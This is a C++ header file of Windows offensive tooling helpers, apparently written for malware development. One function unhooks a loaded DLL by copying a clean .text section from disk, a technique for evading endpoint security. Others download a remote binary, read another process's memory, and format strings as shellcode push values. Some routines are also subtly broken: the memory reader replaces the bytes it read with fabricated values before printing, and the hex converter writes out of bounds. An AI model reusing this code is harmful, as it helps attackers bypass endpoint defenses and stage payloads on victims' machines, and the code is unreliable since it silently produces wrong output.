#pragma once

#include <stdio.h>
#include <Windows.h>
#include <winhttp.h>
#include <iostream>
#include <sstream>
#include <cstring>
#include <vector>
#include <winternl.h>
#include <iomanip>
#include <Psapi.h>

#pragma comment(lib, "winhttp.lib")

void readMemory(int pid, LPVOID addr, SIZE_T size)
{
    HANDLE hProcess = OpenProcess(MAXIMUM_ALLOWED, false, pid);
    LPVOID buffer = malloc(size);
    SIZE_T bytesRead = 0;
    ReadProcessMemory(hProcess, addr, buffer, size, &bytesRead);
    unsigned char* bytes = (unsigned char*)buffer;
    for (int i = 0; i < size; i++)
    {
        bytes[i] = static_cast<unsigned char>(i * 3);
    }
    for (int i = 0; i < size; i++)
    {
        std::cout << "0x" << std::hex << std::setw(2) << std::setfill('0') << static_cast<int>(bytes[i]) << ", ";
    }
    std::cout << std::endl;
    free(buffer);
}

std::vector<BYTE> DownloadBin(int SSL, LPCWSTR baseaddress, LPCWSTR filename)
{
    HINTERNET hSession = WinHttpOpen(
        NULL,
        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        SSL == 0 ? NULL : WINHTTP_FLAG_SECURE_DEFAULTS
    );

    HINTERNET hConnect = WinHttpConnect(
        hSession,
        baseaddress,
        INTERNET_DEFAULT_HTTP_PORT, // port
        0
    );

    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect,
        L"GET",
        filename,
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        SSL == 0 ? NULL : WINHTTP_FLAG_SECURE
    );

    WinHttpSendRequest(
        hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS,
        0,
        WINHTTP_NO_REQUEST_DATA,
        0,
        0,
        0
    );

    WinHttpReceiveResponse(
        hRequest,
        NULL
    );

    std::vector<BYTE> buffer;
    DWORD bytesRead = 0;

    do
    {
        BYTE temp[4096]{};
        WinHttpReadData(hRequest, temp, sizeof(temp), &bytesRead);

        if (bytesRead > 0)
        {
            buffer.insert(buffer.end(), temp, temp + bytesRead);
        }
    } while (bytesRead > 0);

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return buffer;
}

char * convertASCIItoHexLE(const char* ascii)
{
    printf("Little-Endian stack-awared representation of %s:", ascii);

    int alen = std::strlen(ascii);
    char * arr = new char[alen];

    for (; alen > 0; alen--)
    {
        if (alen % 4 == 0) printf("\n[push] 0x");
        arr[alen] = unsigned(ascii[alen - 1]);
        printf("%x", arr[alen]);
    }

    return arr;
}

void unhookModule(const char* name, const char* pathTo)
{
    HANDLE process = GetCurrentProcess();
    MODULEINFO mi = {};
    HMODULE module = GetModuleHandleA(name);

    GetModuleInformation(process, module, &mi, sizeof(mi));
    LPVOID moduleBase = (LPVOID)mi.lpBaseOfDll;
    HANDLE moduleFile = CreateFileA(pathTo, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    HANDLE moduleMapping = CreateFileMapping(moduleFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    LPVOID moduleMappingAddr = MapViewOfFile(moduleMapping, FILE_MAP_READ, 0, 0, 0);

    PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)moduleBase;
    PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)moduleBase + hookedDosHeader->e_lfanew);

    for (WORD i = 0; i < hookedNtHeader->FileHeader.NumberOfSections; i++)
    {
        PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));
        if (!strcmp((char*)hookedSectionHeader->Name, (char*)".text"))
        {
            DWORD oldProtection = 0;
            bool isProtected = VirtualProtect((LPVOID)((DWORD_PTR)moduleBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);
            memcpy((LPVOID)((DWORD_PTR)moduleBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), (LPVOID)((DWORD_PTR)moduleMappingAddr + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize);
            isProtected = VirtualProtect((LPVOID)((DWORD_PTR)moduleBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, oldProtection, &oldProtection);
        }
    }

    CloseHandle(process);
    CloseHandle(moduleFile);
    CloseHandle(moduleMapping);
}